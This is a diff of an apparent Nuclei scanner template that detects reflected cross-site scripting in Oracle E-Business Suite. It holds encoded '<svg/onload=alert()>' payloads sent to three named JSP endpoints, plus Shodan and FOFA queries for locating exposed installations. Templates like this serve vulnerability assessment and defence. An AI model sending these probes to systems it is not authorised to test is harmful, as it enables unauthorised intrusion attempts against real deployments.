@@ -1,5 +1,4 @@
 id: oracle-ebs-xss
-
 info:
   name: Oracle E-Business Suite - Cross-Site Scripting
   author: dhiyaneshDk
@@ -8,46 +7,42 @@ info:
   reference:
     - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
     - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-83
   metadata:
+    fofa-query: body="OA_HTML"
     max-request: 3
     shodan-query: html:"OA_HTML"
-    fofa-query: body="OA_HTML"
-  tags: oracle,xss,ebs,vuln
-
+  tags: ebs,oracle,vuln,xss
 flow: http(1) && http(2)
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-
-    redirects: true
-    matchers:
-      - type: word
+  - matchers:
+      - internal: true
         part: response
+        type: word
         words:
-          - "OA_HTML"
-        internal: true
-
-  - method: GET
+          - OA_HTML
+    method: GET
     path:
-      - "{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
-      - "{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
-      - "{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+      - '{{BaseURL}}'
+    redirects: true
+  - matchers:
+      - part: body
+        type: word
         words:
-          - "<svg/onload=alert('{{randstr}}')>"
-
-      - type: status
-        status:
+          - <svg/onload=alert('{{randstr}}')>
+      - status:
           - 200
-
-      - type: word
-        part: header
+        type: status
+      - part: header
+        type: word
         words:
-          - "text/html"
-
+          - text/html
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert(''{{randstr}}'')%3E'
+      - '{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(''{{randstr}}'')%3E'
+      - '{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(''{{randstr}}'')%3E'
